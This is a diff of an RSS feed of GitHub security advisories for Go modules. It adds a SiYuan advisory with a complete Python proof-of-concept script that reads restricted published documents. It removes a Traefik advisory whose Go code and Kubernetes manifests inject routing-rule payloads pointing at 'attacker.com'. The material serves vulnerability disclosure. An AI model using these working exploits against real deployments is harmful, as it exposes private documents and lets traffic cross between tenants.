@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://xlordz.github.io/github-advisory-database-rss/go.rss</id>
     <title>Security Advisory for Go modules</title>
-    <updated>2026-03-27T21:19:53.084Z</updated>
+    <updated>2026-03-27T21:53:15.965Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago"/>
     <subtitle>Security Advisory for Go modules on GitHub</subtitle>
@@ -11,6 +11,158 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[github.com/siyuan-note/siyuan/kernel] SiYuan has Arbitrary Document Reading within the Publishing Service]]></title>
+        <id>https://github.com/advisories/GHSA-34xj-66v3-6j83</id>
+        <link href="https://github.com/advisories/GHSA-34xj-66v3-6j83"/>
+        <updated>2026-03-27T21:20:42.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="details">Details</h3>
+<p>Document IDs were retrieved via the /api/file/readDir interface, and then the /api/block/getChildBlocks interface was used to view the content of all documents.</p>
+<h3 id="poc">PoC</h3>
+<pre><code class="language-python">#!/usr/bin/env python3
+"""SiYuan /api/block/getChildBlocks 文档内容读取"""
+import requests
+import json
+import sys
+
+def get_child_blocks(target_url, doc_id):
+    """
+    调用 SiYuan 的 /api/block/getChildBlocks API 获取文档内容
+    """
+    url = f"{target_url.rstrip('/')}/api/block/getChildBlocks"
+    
+    headers = {
+        "Content-Type": "application/json"
+    }
+    
+    data = {
+        "id": doc_id
+    }
+    
+    try:
+        response = requests.post(url, json=data, headers=headers, timeout=10)
+        response.raise_for_status()
+        
+        result = response.json()
+        
+        if result.get("code") != 0:
+            print(f"[-] 请求失败: {result.get('msg', '未知错误')}")
+            return None
+        
+        return result.get("data")
+        
+    except requests.exceptions.RequestException as e:
+        print(f"[-] 网络请求失败: {e}")
+        return None
+    except json.JSONDecodeError as e:
+        print(f"[-] JSON解析失败: {e}")
+        return None
+
+def format_block_content(block):
+    """格式化块内容"""
+    content = ""
+    
+    # 获取块内容
+    if isinstance(block, dict):
+        # 尝试多种可能的字段
+        md = block.get("markdown", "") or block.get("content", "") or ""
+        if md:
+            content = md.strip()
+    
+    return content
+
+def main():
+    """主函数"""
+    if len(sys.argv) &gt; 1:
+        target_url = sys.argv[1]
+    else:
+        target_url = input("请输入 SiYuan 服务地址 (例如: http://localhost:6806): ").strip()
+        if not target_url:
+            target_url = "http://localhost:6806"
+    
+    print(f"目标地址: {target_url}")
+    print("=" * 50)
+    
+    while True:
+        print("\n" + "=" * 50)
+        doc_id = input("请输入文档ID (输入 'quit' 或 'exit' 退出): ").strip()
+        
+        if doc_id.lower() in ['quit', 'exit', 'q']:
+            print("程序退出")
+            break
+        
+        if not doc_id:
+            print("[-] 文档ID不能为空")
+            continue
+        
+        print(f"\n[*] 正在读取文档: {doc_id}")
+        
+        blocks = get_child_blocks(target_url, doc_id)
+        
+        if blocks is None:
+            print("[-] 获取文档内容失败")
+            continue
+        
+        if not blocks:
+            print(f"[!] 文档 {doc_id} 没有子块或为空")
+            continue
+        
+        print(f"[+] 成功获取 {len(blocks)} 个子块")
+        print("-" * 50)
+        
+        # 保存所有块内容
+        all_blocks_content = []
+        
+        for i, block in enumerate(blocks, 1):
+            content = format_block_content(block)
+            if content:
+                print(content[:200] + ("..." if len(content) &gt; 200 else ""))
+                
+                all_blocks_content.append({
+                    "index": i,
+                    "content": content,
+                    "raw_block": block
+                })
+        
+        # 询问是否保存到文件
+        save_choice = input("\n是否保存到文件? (y/N): ").strip().lower()
+        if save_choice in ['y', 'yes']:
+            filename = f"doc_{doc_id}_blocks.json"
+            try:
+                with open(filename, "w", encoding="utf-8") as f:
+                    json.dump({
+                        "doc_id": doc_id,
+                        "block_count": len(blocks),
+                        "blocks": all_blocks_content
+                    }, f, ensure_ascii=False, indent=2)
+                print(f"[+] 已保存到: {filename}")
+            except Exception as e:
+                print(f"[-] 保存失败: {e}")
+        
+        print("-" * 50)
+
+if __name__ == "__main__":
+    main()
+</code></pre>
+<img src="https://github.com/user-attachments/assets/2e08a286-dceb-4fd5-87d5-44f39983dcbc" alt="image" height="757" width="1492">
+
+<h3 id="impact">Impact</h3>
+<p>File reading: All encrypted or prohibited documents under the publishing service could be read.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/siyuan-note/siyuan/security/advisories/GHSA-34xj-66v3-6j83">https://github.com/siyuan-note/siyuan/security/advisories/GHSA-34xj-66v3-6j83</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-33669">https://nvd.nist.gov/vuln/detail/CVE-2026-33669</a></li>
+<li><a href="https://github.com/advisories/GHSA-34xj-66v3-6j83">https://github.com/advisories/GHSA-34xj-66v3-6j83</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-34xj-66v3-6j83</uri>
+        </author>
+        <category label="severity" term="CRITICAL"/>
+        <published>2026-03-25T19:36:22.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[github.com/pinchtab/pinchtab] PinchTab: OS Command Injection via Profile Name in Windows Cleanup Routine Enables Arbitrary Command Execution]]></title>
         <id>https://github.com/advisories/GHSA-p8mm-644p-phmh</id>
@@ -1326,7 +1478,7 @@ req.Header.Set(b.headerField, user)
         <title type="html"><![CDATA[[github.com/flannel-io/flannel] Flannel has cross-node remote code execution via extension backend BackendData injection]]></title>
         <id>https://github.com/advisories/GHSA-vchx-5pr6-ffx2</id>
         <link href="https://github.com/advisories/GHSA-vchx-5pr6-ffx2"/>
-        <updated>2026-03-27T20:28:15.000Z</updated>
+        <updated>2026-03-27T21:48:13.000Z</updated>
         <content type="html"><![CDATA[<h3 id="background">Background</h3>
 <p>The Flannel project includes an experimental Extension backend that allows users to easily prototype new backend types. This backend uses shell commands stored in Kubernetes annotations to configure network connectivity on the node.</p>
 <p>Note: consumers are only affected by this vulnerability if they use the experimental Extension backend. Other backends such as vxlan and wireguard are unaffected.</p>
@@ -1346,6 +1498,7 @@ req.Header.Set(b.headerField, user)
 <li><a href="https://github.com/flannel-io/flannel/security/advisories/GHSA-vchx-5pr6-ffx2">https://github.com/flannel-io/flannel/security/advisories/GHSA-vchx-5pr6-ffx2</a></li>
 <li><a href="https://github.com/flannel-io/flannel/commit/08bc9a4c990ae785d2fcb448f4991b58485cd26a">https://github.com/flannel-io/flannel/commit/08bc9a4c990ae785d2fcb448f4991b58485cd26a</a></li>
 <li><a href="https://github.com/flannel-io/flannel/releases/tag/v0.28.2">https://github.com/flannel-io/flannel/releases/tag/v0.28.2</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-32241">https://nvd.nist.gov/vuln/detail/CVE-2026-32241</a></li>
 <li><a href="https://github.com/advisories/GHSA-vchx-5pr6-ffx2">https://github.com/advisories/GHSA-vchx-5pr6-ffx2</a></li>
 </ul>
 ]]></content>
@@ -1361,7 +1514,7 @@ req.Header.Set(b.headerField, user)
         <title type="html"><![CDATA[[github.com/fleetdm/fleet/v4] A Fleet team maintainer can transfer hosts from any team via missing source team authorization]]></title>
         <id>https://github.com/advisories/GHSA-m2h6-4xpq-qw3m</id>
         <link href="https://github.com/advisories/GHSA-m2h6-4xpq-qw3m"/>
-        <updated>2026-03-27T20:24:24.000Z</updated>
+        <updated>2026-03-27T21:48:01.000Z</updated>
         <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
 <p>A broken access control vulnerability in Fleet's host transfer API allows a team maintainer to transfer hosts from any team into their own team, bypassing team isolation boundaries. Once transferred, the attacker gains full control over the stolen hosts, including the ability to execute scripts with root privileges.</p>
 <h3 id="impact">Impact</h3>
@@ -1380,6 +1533,7 @@ Join #fleet in <a href="https://join.slack.com/t/osquery/shared_invite/zt-h29zm0
 <ul>
 <li><a href="https://github.com/fleetdm/fleet/security/advisories/GHSA-m2h6-4xpq-qw3m">https://github.com/fleetdm/fleet/security/advisories/GHSA-m2h6-4xpq-qw3m</a></li>
 <li><a href="https://github.com/fleetdm/fleet/releases/tag/fleet-v4.81.1">https://github.com/fleetdm/fleet/releases/tag/fleet-v4.81.1</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-29180">https://nvd.nist.gov/vuln/detail/CVE-2026-29180</a></li>
 <li><a href="https://github.com/advisories/GHSA-m2h6-4xpq-qw3m">https://github.com/advisories/GHSA-m2h6-4xpq-qw3m</a></li>
 </ul>
 ]]></content>
@@ -1548,7 +1702,7 @@ case "add-path":
         <title type="html"><![CDATA[[github.com/fleetdm/fleet/v4] Fleet's unbounded request body read allows remote Denial of Service]]></title>
         <id>https://github.com/advisories/GHSA-99hj-44vg-hfcp</id>
         <link href="https://github.com/advisories/GHSA-99hj-44vg-hfcp"/>
-        <updated>2026-03-27T18:17:43.000Z</updated>
+        <updated>2026-03-27T21:47:51.000Z</updated>
         <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
 <p>Fleet contained multiple unauthenticated HTTP endpoints that read request bodies without enforcing a size limit. An unauthenticated attacker could exploit this behavior by sending large or repeated HTTP payloads, causing excessive memory allocation and resulting in a denial-of-service (DoS) condition.</p>
 <h3 id="impact">Impact</h3>
@@ -1575,6 +1729,7 @@ case "add-path":
 <h3 id="references">References</h3>
 <ul>
 <li><a href="https://github.com/fleetdm/fleet/security/advisories/GHSA-99hj-44vg-hfcp">https://github.com/fleetdm/fleet/security/advisories/GHSA-99hj-44vg-hfcp</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-26061">https://nvd.nist.gov/vuln/detail/CVE-2026-26061</a></li>
 <li><a href="https://github.com/advisories/GHSA-99hj-44vg-hfcp">https://github.com/advisories/GHSA-99hj-44vg-hfcp</a></li>
 </ul>
 ]]></content>
@@ -1590,7 +1745,7 @@ case "add-path":
         <title type="html"><![CDATA[[github.com/fleetdm/fleet/v4] Fleet: Password reset tokens remain valid after password change for 24 hours]]></title>
         <id>https://github.com/advisories/GHSA-3458-r943-hmx4</id>
         <link href="https://github.com/advisories/GHSA-3458-r943-hmx4"/>
-        <updated>2026-03-27T18:17:10.000Z</updated>
+        <updated>2026-03-27T21:47:36.000Z</updated>
         <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
 <p>A vulnerability in Fleet’s password management logic could allow previously issued password reset tokens to remain valid after a user changes their password. As a result, a stale password reset token could be reused to reset the account password even after a defensive password change.</p>
 <h3 id="impact">Impact</h3>
@@ -1606,6 +1761,7 @@ case "add-path":
 <h3 id="references">References</h3>
 <ul>
 <li><a href="https://github.com/fleetdm/fleet/security/advisories/GHSA-3458-r943-hmx4">https://github.com/fleetdm/fleet/security/advisories/GHSA-3458-r943-hmx4</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-26060">https://nvd.nist.gov/vuln/detail/CVE-2026-26060</a></li>
 <li><a href="https://github.com/advisories/GHSA-3458-r943-hmx4">https://github.com/advisories/GHSA-3458-r943-hmx4</a></li>
 </ul>
 ]]></content>
@@ -1616,299 +1772,5 @@ case "add-path":
         </author>
         <category label="severity" term="MODERATE"/>
         <published>2026-03-27T18:17:09.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/traefik/traefik/v2] Traefik has Knative Ingress Rule Injection that Allows Host Restriction Bypass]]></title>
-        <id>https://github.com/advisories/GHSA-67jx-r9pv-98rj</id>
-        <link href="https://github.com/advisories/GHSA-67jx-r9pv-98rj"/>
-        <updated>2026-03-27T17:49:53.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
-<p>There is a potential vulnerability in Traefik's Kubernetes Knative, Ingress, and Ingress-NGINX providers related to rule injection.</p>
-<p>User-controlled values are interpolated into backtick-delimited Traefik router rule expressions without escaping or validation. A malicious value containing a backtick can terminate the literal and inject additional operators into Traefik's rule language, altering the parsed rule tree. In shared or multi-tenant deployments, this can bypass host and header routing constraints and redirect unauthorized traffic to victim services.</p>
-<h2 id="patches">Patches</h2>
-<ul>
-<li><a href="https://github.com/traefik/traefik/releases/tag/v3.6.11">https://github.com/traefik/traefik/releases/tag/v3.6.11</a></li>
-<li><a href="https://github.com/traefik/traefik/releases/tag/v3.7.0-ea.2">https://github.com/traefik/traefik/releases/tag/v3.7.0-ea.2</a></li>
-</ul>
-<h2 id="for-more-information">For more information</h2>
-<p>If there are any questions or comments about this advisory, please <a href="https://github.com/traefik/traefik/issues">open an issue</a>.</p>
-<details>
-<summary>Original Description</summary>
-
-<h3 id="summary-1">Summary</h3>
-<p>Traefik's Knative provider builds router rules by interpolating user-controlled values into backtick-delimited rule expressions without escaping. In live cluster validation, Knative <code>rules[].hosts[]</code> was exploitable for host restriction bypass (for example <code>tenant.example.com</code>) || Host(<code>attacker.com</code>), producing a router that serves attacker-controlled hosts. Knative <code>headers[].exact</code> also allows rule-syntax injection and proves unsafe rule construction. In multi-tenant clusters, this can route unauthorized traffic to victim services and lead to cross-tenant traffic exposure. Severity is High in shared deployments.</p>
-<p>Tested on Traefik <code>v3.6.10</code>; the vulnerable pattern appears to have been present since the Knative provider was introduced. Earlier versions with Knative provider support are expected to be affected.</p>
-<h3 id="details">Details</h3>
-<p>The issue is caused by unsafe rule-string construction using <code>fmt.Sprintf</code> with backtick-delimited literals.</p>
-<p>Incriminated code patterns:</p>
-<ul>
-<li><p><code>pkg/provider/kubernetes/knative/kubernetes.go</code></p>
-<ul>
-<li><code>fmt.Sprintf("Host(</code>%v<code>)", host)</code></li>
-<li><code>fmt.Sprintf("Header(</code>%s<code>,</code>%s<code>)", key, headers[key].Exact)</code></li>
-<li><code>fmt.Sprintf("PathPrefix(</code>%s<code>)", path)</code></li>
-</ul>
-</li>
-<li><p><code>pkg/provider/kubernetes/ingress/kubernetes.go</code></p>
-<ul>
-<li><code>fmt.Sprintf("Host(</code>%s<code>)", host)</code></li>
-<li><code>fmt.Sprintf("(Path(</code>%[1]s<code>) || PathPrefix(</code>%[1]s/<code>))", path)</code></li>
-</ul>
-</li>
-<li><p><code>pkg/provider/kubernetes/ingress-nginx/kubernetes.go</code> (hardening candidate; not the primary confirmed vector in this report)</p>
-<ul>
-<li><code>fmt.Sprintf("Header(</code>%s<code>, </code>%s<code>)", c.Header, c.HeaderValue)</code></li>
-<li>related host/path/header concatenations with backticks</li>
-</ul>
-</li>
-</ul>
-<p>Because inputs are inserted directly into rule expressions, a malicious value containing a backtick can terminate the literal and inject additional operators/tokens in Traefik's rule language. Example payload:</p>
-<ul>
-<li><code>x</code>) || Host(<code>attacker.com</code></li>
-</ul>
-<p>When used as a header value in Knative rule construction, the resulting rule contains:</p>
-<ul>
-<li><code>Header(</code>X-Poc<code>,</code>x<code>) || Host(</code>attacker.com<code>)</code></li>
-</ul>
-<p>This alters rule semantics and enables injection into Traefik's rule language. Depending on the field used (<code>hosts[]</code> vs <code>headers[].exact</code>) this can become a direct routing bypass.</p>
-<p>Important scope note:</p>
-<ul>
-<li>Gateway API code path (<code>pkg/provider/kubernetes/gateway/httproute.go</code>) already uses safer <code>%q</code> formatting for header/query rules and is not affected by this exact pattern.</li>
-<li>For standard Kubernetes Ingress, <code>spec.rules.host</code> is validated as DNS-1123 by the API server, which rejects backticks (so this specific host-injection payload is typically blocked).</li>
-<li>For Knative Ingress, <code>rules[].hosts[]</code> and <code>headers[].exact</code> are typed as <code>string</code> in CRD schema with no pattern constraint.</li>
-<li>In this validation environment, <code>rules[].hosts[]</code> was accepted and produced a practical host bypass. <code>headers[].exact</code> was also accepted and produced rule-syntax injection in generated routers.</li>
-<li>Ingress-NGINX patterns are included as follow-up hardening targets and are not claimed as independently exploitable here.</li>
-<li>Exploitability depends on admission/validation policy and who can create these resources.</li>
-</ul>
-<h3 id="poc">PoC</h3>
-<ol>
-<li>Local deterministic PoC (no cluster required):</li>
-</ol>
-<ul>
-<li>Run:<ul>
-<li>Save the inline PoC below as <code>poc_build_rule.go</code></li>
-<li>Run <code>go run poc_build_rule.go</code></li>
-</ul>
-</li>
-<li>Observe output:<ul>
-<li>Legitimate rule: <code>(Host(</code>tenant.example.com<code>)) &amp;&amp; (Header(</code>X-API-Key<code>,</code>secret123<code>)) &amp;&amp; PathPrefix(</code>/<code>)</code></li>
-<li>Malicious rule: <code>(Host(</code>tenant.example.com<code>)) &amp;&amp; (Header(</code>X-API-Key<code>,</code>x<code>) || Host(</code>attacker.com<code>)) &amp;&amp; PathPrefix(</code>/<code>)</code></li>
-</ul>
-</li>
-<li>This proves syntax injection in current string-construction logic.</li>
-</ul>
-<p>Inline PoC code (self-contained):</p>
-<pre><code class="language-go">package main
-
-import (
-    "fmt"
-    "sort"
-    "strings"
-)
-
-func buildRuleKnative(hosts []string, headers map[string]struct{ Exact string }, path string) string {
-    var operands []string
-
-    if len(hosts) &gt; 0 {
-        var hostRules []string
-        for _, host := range hosts {
-            hostRules = append(hostRules, fmt.Sprintf("Host(`%v`)", host))
-        }
-        operands = append(operands, fmt.Sprintf("(%s)", strings.Join(hostRules, " || ")))
-    }
-
-    if len(headers) &gt; 0 {
-        headerKeys := make([]string, 0, len(headers))
-        for k := range headers {
-            headerKeys = append(headerKeys, k)
-        }
-        sort.Strings(headerKeys)
-
-        var headerRules []string
-        for _, key := range headerKeys {
-            headerRules = append(headerRules, fmt.Sprintf("Header(`%s`,`%s`)", key, headers[key].Exact))
-        }
-        operands = append(operands, fmt.Sprintf("(%s)", strings.Join(headerRules, " &amp;&amp; ")))
-    }
-
-    if len(path) &gt; 0 {
-        operands = append(operands, fmt.Sprintf("PathPrefix(`%s`)", path))
-    }
-
-    return strings.Join(operands, " &amp;&amp; ")
-}
-
-func main() {
-    legitHeaders := map[string]struct{ Exact string }{
-        "X-API-Key": {Exact: "secret123"},
-    }
-    fmt.Println(buildRuleKnative([]string{"tenant.example.com"}, legitHeaders, "/"))
-
-    maliciousHeaders := map[string]struct{ Exact string }{
-        "X-API-Key": {Exact: "x`) || Host(`attacker.com"},
-    }
-    fmt.Println(buildRuleKnative([]string{"tenant.example.com"}, maliciousHeaders, "/"))
-
-    // Safe variant example (Gateway-style):
-    fmt.Println(fmt.Sprintf("Header(%q,%q)", "X-API-Key", "x`) || Host(`attacker.com"))
-}
-</code></pre>
-<ol start="2">
-<li>Cluster PoC (Knative host injection, primary / practical bypass):</li>
-</ol>
-<ul>
-<li>Preconditions:<ul>
-<li>Kubernetes test cluster with Knative Serving.</li>
-<li>Traefik configured with Knative provider.</li>
-</ul>
-</li>
-<li>Apply manifest:<ul>
-<li><code>kubectl apply -f - &lt;&lt;'YAML'</code></li>
-</ul>
-</li>
-</ul>
-<pre><code class="language-yaml">apiVersion: networking.internal.knative.dev/v1alpha1
-kind: Ingress
-metadata:
-  name: poc-host-injection
-  namespace: default
-  annotations:
-    # This exact key worked in live validation:
-    networking.knative.dev/ingress.class: "traefik.ingress.networking.knative.dev"
-spec:
-  rules:
-    - hosts:
-        - 'tenant.example.com`) || Host(`attacker.com'
-      visibility: External
-      http:
-        paths:
-          - path: "/"
-            splits:
-              - percent: 100
-                serviceName: dummy
-                serviceNamespace: default
-                servicePort: 80
-YAML
-</code></pre>
-<ul>
-<li>(If API version mismatch, adjust between <code>networking.internal.knative.dev/v1alpha1</code> and <code>networking.knative.dev/v1alpha1</code>.)</li>
-<li>Verify:<ul>
-<li>Check Traefik router rule contains: <code>(Host(</code>tenant.example.com<code>) || Host(</code>attacker.com<code>)) &amp;&amp; PathPrefix(</code>/<code>)</code>.</li>
-<li>Request with <code>Host: attacker.com</code> returns backend 200.</li>
-<li>This demonstrates host restriction bypass in practice.</li>
-</ul>
-</li>
-</ul>
-<ol start="3">
-<li>Cluster PoC (Knative header injection, confirms rule-syntax injection):</li>
-</ol>
-<ul>
-<li>Apply:<ul>
-<li><code>kubectl apply -f - &lt;&lt;'YAML'</code></li>
-</ul>
-</li>
-</ul>
-<pre><code class="language-yaml">apiVersion: networking.internal.knative.dev/v1alpha1
-kind: Ingress
-metadata:
-  name: poc-rule-injection
-  namespace: default
-  annotations:
-    networking.knative.dev/ingress.class: "traefik.ingress.networking.knative.dev"
-spec:
-  rules:
-    - hosts:
-        - "tenant.example.com"
-      visibility: External
-      http:
-        paths:
-          - path: "/"
-            headers:
-              X-Poc:
-                exact: 'x`) || Host(`attacker.com'
-            splits:
-              - percent: 100
-                serviceName: dummy
-                serviceNamespace: default
-                servicePort: 80
-YAML
-</code></pre>
-<ul>
-<li>Verify:<ul>
-<li>Inspect generated Traefik dynamic router rule (API/dashboard/logs).</li>
-<li>Confirm injected fragment <code>|| Host(</code>attacker.com<code>)</code> is present.</li>
-<li>Send request with <code>Host: attacker.com</code> and no expected tenant header (expected: 404 for this payload shape, because leading <code>Host(tenant)</code> still applies).</li>
-<li>Send request with <code>Host: tenant.example.com</code> and <code>X-Poc: x</code> (expected: 200 from backend).</li>
-</ul>
-</li>
-</ul>
-<ol start="4">
-<li>Optional Ingress PoC (scope check):</li>
-</ol>
-<ul>
-<li>Apply:<ul>
-<li><code>kubectl apply -f - &lt;&lt;'YAML'</code></li>
-</ul>
-</li>
-</ul>
-<pre><code class="language-yaml">apiVersion: networking.k8s.io/v1
-kind: Ingress
-metadata:
-  name: poc-ingress-host-injection
-  namespace: default
-  annotations:
-    kubernetes.io/ingress.class: traefik
-spec:
-  rules:
-    - host: 'tenant.example.com`) || Host(`attacker.com'
-      http:
-        paths:
-          - path: /
-            pathType: Prefix
-            backend:
-              service:
-                name: dummy
-                port:
-                  number: 80
-YAML
-</code></pre>
-<ul>
-<li>Expected in most clusters: API server rejects this payload because Ingress <code>host</code> must satisfy DNS-1123.</li>
-<li>Keep this step only as a negative control to demonstrate the distinction between native Ingress validation and Knative CRD behavior.</li>
-</ul>
-<p>Validation executed in this report:</p>
-<ul>
-<li>Local deterministic PoC executed with <code>go run</code> and output matched expected injected rule.</li>
-<li>Live cluster test executed on local <code>kind</code> cluster (<code>kind-traefik-poc</code>) with Traefik <code>v3.6.10</code> and Knative Serving CRDs.</li>
-<li>Annotation key confirmed in this environment: <code>networking.knative.dev/ingress.class</code> (dot). The hyphen variant was not used by the successful processing path.</li>
-<li>Traefik API/logs confirmed generated routers included injected expressions.</li>
-<li>Live HTTP request with <code>Host: attacker.com</code> reached backend (<code>200</code>) for Knative host-injection payload.</li>
-</ul>
-<h3 id="impact">Impact</h3>
-<ul>
-<li><strong>Vulnerability type:</strong> Rule injection / authorization bypass at routing layer.</li>
-<li><strong>Primary impact:</strong> Bypass of intended routing predicates (host/header/path), enabling unauthorized routing to protected services.</li>
-<li><strong>Who is impacted:</strong> Primarily deployments using Traefik Knative provider where untrusted or semi-trusted actors can create/update Knative Ingress resources (typical in multi-tenant clusters, shared namespaces, or weak admission controls). Standard Kubernetes Ingress host injection is usually blocked by API validation.</li>
-<li><strong>Security consequences:</strong> Cross-tenant traffic access, internal service exposure, policy bypass, and potential chaining with app-level vulnerabilities.</li>
-</ul>
-</details>
-### References
-
-<ul>
-<li><a href="https://github.com/traefik/traefik/security/advisories/GHSA-67jx-r9pv-98rj">https://github.com/traefik/traefik/security/advisories/GHSA-67jx-r9pv-98rj</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-32695">https://nvd.nist.gov/vuln/detail/CVE-2026-32695</a></li>
-<li><a href="https://github.com/traefik/traefik/commit/11d251415a6fd935025df5a9dda898e17e3097b2">https://github.com/traefik/traefik/commit/11d251415a6fd935025df5a9dda898e17e3097b2</a></li>
-<li><a href="https://github.com/traefik/traefik/releases/tag/v3.6.11">https://github.com/traefik/traefik/releases/tag/v3.6.11</a></li>
-<li><a href="https://github.com/traefik/traefik/releases/tag/v3.7.0-ea.2">https://github.com/traefik/traefik/releases/tag/v3.7.0-ea.2</a></li>
-<li><a href="https://github.com/advisories/GHSA-67jx-r9pv-98rj">https://github.com/advisories/GHSA-67jx-r9pv-98rj</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-67jx-r9pv-98rj</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-03-27T17:49:52.000Z</published>
     </entry>
 </feed>
